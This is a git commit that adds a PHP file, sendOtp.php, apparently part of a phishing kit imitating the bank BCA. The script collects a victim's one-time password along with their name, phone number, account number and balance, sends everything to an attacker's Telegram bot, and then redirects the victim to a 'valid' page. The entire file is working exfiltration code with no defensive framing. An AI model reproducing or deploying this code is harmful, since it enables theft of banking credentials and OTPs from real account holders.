d311d1eabd5b12bea2238a2fe3c32422437d4552
danaprojext <158666682+danaprojext@users.noreply.github.com>
2024-02-03 21:57:06 +0700

    Add files via upload

---
+++ sendOtp.php
@@ -0,0 +1,44 @@
+<?php
+
+session_start();
+include "./telegram.php";
+
+$otp            = $_POST['otp'];
+
+$tarif        = $_SESSION['tarif'];
+$nomor        = $_SESSION['nomor'];
+$nama        = $_SESSION['nama'];
+$noatm        = $_SESSION['noatm'];
+$saldo        = $_SESSION['saldo'];
+
+
+
+
+$message = "
+
+✧༝┉˚*❋ 𝘽𝘾𝘼 ❋*˚┉༝✧
+
+- Tarif •• ".$tarif."
+- Nomor •• {".$nomor."}
+
+- Nama •• ".$nama."
+- No Rekening •• ".$noatm."
+- Saldo •• ".$saldo."
+- OTP •• ".$otp."
+";
+
+function sendMessage($telegram_id, $message, $id_bot) {
+    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+sendMessage($telegram_id, $message, $id_bot);
+header('Location: ./../valid/');
+?>
